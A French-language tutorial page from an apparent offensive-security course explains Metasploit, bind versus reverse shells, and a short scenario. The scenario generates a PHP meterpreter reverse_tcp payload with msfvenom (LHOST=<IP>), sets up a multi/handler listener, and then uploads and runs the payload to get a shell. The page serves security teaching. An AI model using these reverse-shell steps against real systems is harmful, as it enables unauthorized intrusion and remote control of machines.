---
layout: default  
title: metasploit  
parent: Étapes d'une attaque  
nav_order: 7
published: false
---

# Metasploit  

**Metasploit** est l’un des frameworks d’exploitation les plus connus et les plus utilisés en cybersécurité offensive. Contrairement aux outils précédents, qui permettent d’observer, tester ou automatiser certaines attaques, Metasploit occupe une place particulière : il permet de **mettre en œuvre une exploitation complète** à partir d’une vulnérabilité identifiée.

Tous les outils vus jusqu'à présent nous ont permis de :

- observer un système (ex.: nmap, whatweb)  
- analyser ses interactions (ex.: Burp Suite)  
- découvrir des éléments cachés (ex.: gobuster)  
- tester des hypothèses (ex: Burp Suite, injections)  
- automatiser certaines attaques (ex.: sqlmap, hydra)  

Metasploit intervient à une étape différente. Il ne cherche plus à comprendre le système, mais plutôt à exploiter activement une vulnérabilité décelée afin d'attaquer le système.

{: .highlight}
> Dans une démarche offensive, cela correspond à un changement de perspective. On ne se demande plus *si une vulnérabilité existe*, mais plutôt *comment on peut l'exploiter*.

---

## Objectif  

L’objectif principal de Metasploit est de :

- exploiter une vulnérabilité  
- exécuter du code sur une cible  
- obtenir un accès au système  
- interagir avec la machine compromise  

Concrètement, Metasploit permet :

- d’obtenir un shell à distance  
- d’exécuter des commandes  
- de récupérer des informations système  
- d’explorer un environnement compromis  

{: .highlight}
> Metasploit transforme une vulnérabilité en **accès réel**

---

## Quand l’utiliser ?  

Metasploit n’est jamais utilisé en premier. Il intervient uniquement lorsque :

- une vulnérabilité est identifiée  
- son exploitation est plausible  
- une entrée contrôlée est disponible  

Dans le cycle d’une attaque, Metasploit correspond à la toute dernière phase : **Exploiter**. En ce sens, il dépend entièrement du travail réalisé avant.

---

## Fonctionnement  

Metasploit repose sur un concept clé : les **modules d’exploitation**. Un module représente :

- une vulnérabilité connue  
- une méthode d’exploitation  
- une configuration spécifique  

Chaque exploitation repose sur trois éléments :

- **L'exploit** : le code qui exploite une vulnérabilité
- **La charge utile** (*payload*) : le code exécuté pendant l'attaque
- **Les paramètres** : les informations de configuration nécessaires à l'exécution

C’est la combinaison de ces éléments qui permet l’attaque

---

## Bind shell vs reverse shell
Le premier objectif de Metasploit est souvent d'obtenir un accès sur une machine vulnérable. Ceci se traduit souvent par l'accès à un interpréteur de commandes (*shell*). Il existe deux méthodes différentes pour obtenir cet accès avec Metasploit: le shell direct (*bind shell*) et le shell inversé (*reverse shell*).

### Bind shell
Un *bind shell* et un *reverse shell* sont deux mécanismes utilisés par Metasploit pour permettre à un attaquant d’obtenir un accès distant à une machine compromise, mais ils reposent sur des logiques de communication opposées.

Dans un *bind shell*, la machine cible ouvre un port en attente de connexion, puis attache (*bind*) un shell à ce port. Concrètement, après l'exploitation d’une vulnérabilité, un service est lancé sur la cible et écoute sur un port spécifique. L’attaquant peut ensuite se connecter directement à ce port pour obtenir un shell interactif. Le flux de communication est donc classique :

```
Attaquant → Cible
```

Cette approche est relativement simple et directe. Elle est souvent utilisée dans des environnements de laboratoire ou des réseaux contrôlés, où aucun filtrage restrictif n’empêche les connexions entrantes. Dans Metasploit, cela correspond par exemple à l’utilisation d’un payload de type ***bind_tcp***, qui configure automatiquement la machine cible pour écouter sur un port donné et accepter une connexion.

Un bind shell est approprié lorsque :

- la cible est directement accessible
- aucun filtrage réseau strict n’est présent
- on travaille dans un environnement local ou de laboratoire
- on veut une implémentation simple et rapide


### Reverse shell
Cependant, le *bind shell* présente une limitation majeure dans des environnements réels : il nécessite que la cible accepte des connexions entrantes. Or, dans la plupart des infrastructures modernes, les pare-feu bloquent par défaut les connexions entrantes non sollicitées. Même si une machine est vulnérable, il peut être impossible d’y accéder directement depuis l’extérieur.

C’est précisément dans ce contexte qu’un *reverse shell* devient beaucoup plus pertinent. Dans un *reverse shell*, la logique est inversée : au lieu d’attendre une connexion, la machine cible initie elle-même une connexion vers l’attaquant après exploitation. Le shell est envoyé “en retour” vers une machine contrôlée par l’attaquant, qui agit comme un serveur en attente. Le flux de communication devient alors :

```
Cible → Attaquant
```

Dans Metasploit, cela correspond généralement à des payloads comme ***reverse_tcp*** ou ***meterpreter/reverse_tcp***, où l’on définit explicitement :

**LHOST** : l’adresse de l’attaquant
**LPORT** : le port sur lequel il attend la connexion


L’intérêt majeur du *reverse shell* vient du fait que les connexions sortantes sont presque toujours autorisées dans un réseau. Une machine a besoin d’accéder à Internet pour fonctionner (mise à jour, APIs, navigation, etc.), ce qui signifie que ce type de communication est rarement bloqué. En conséquence, un *reverse shell* permet de contourner efficacement les restrictions liées aux pare-feu et d’obtenir un accès là où un bind shell échouerait.

Un reverse shell est privilégié lorsque :

- la cible est protégée par un pare-feu
- les connexions entrantes sont bloquées
- la cible peut établir des connexions sortantes
- on est dans un environnement réaliste (entreprise, cloud, Internet)

{.: highlight}
> En pratique, dans un contexte réel de sécurité offensive, le reverse shell est largement plus utilisé. Il correspond mieux aux contraintes des infrastructures modernes et s’intègre naturellement dans des scénarios d’exploitation combinés (upload de fichier, injection, exécution distante, etc.).

## Structure de Metasploit  

Metasploit est utilisé via une interface :

```bash
msfconsole
```

Dans msfconsole :

```text
use exploit/...
set ...
run
```

---

### Synopsis logique

```text
Metasploit
│
├─ exploit
│   → vulnérabilité ciblée
│
├─ payload
│   → code exécuté
│
├─ options
│   → IP, port, etc.
│
└─ execution
    → run / exploit
```

---

## Commandes principales  

### Lancer Metasploit

```bash
msfconsole
```

### Chercher un exploit

```bash
search php
```

### Utiliser un exploit

```bash
use exploit/multi/handler
```

### Configurer

```bash
set payload php/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
```

### Lancer

```bash
run
```

---

## Génération de charge utile (msfvenom)

### Exemple

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
```

---

### Décomposition

```text
msfvenom
│
├─ -p php/meterpreter/reverse_tcp
├─ LHOST
├─ LPORT
└─ format
```

---

## Scénario complet  

### Étape 1

Créer une charge utile malveillante :

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
```

---

### Étape 2

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run
```

---

### Étape 3

- upload du fichier  
- exécution

---

### Résultat

👉 connexion entrante reçue  
👉 shell obtenu

---

## Limites  

- nécessite une vulnérabilité  
- peut être détecté  
- configuration parfois complexe  

---

## Défense associée  

- corriger les vulnérabilités  
- filtrer les uploads  
- surveiller connexions sortantes  

---

## Conclusion  

Metasploit transforme une vulnérabilité en compromission réelle.

---

> *Un outil teste.*  
> *Un outil automatise.*  
> *Metasploit exploite.* 

---

## Liens utiles
- Site officiel : [https://www.metasploit.com/](https://www.metasploit.com/)
- Documentation complète : [https://docs.metasploit.com/](https://docs.metasploit.com/)
- msfvenom : [https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
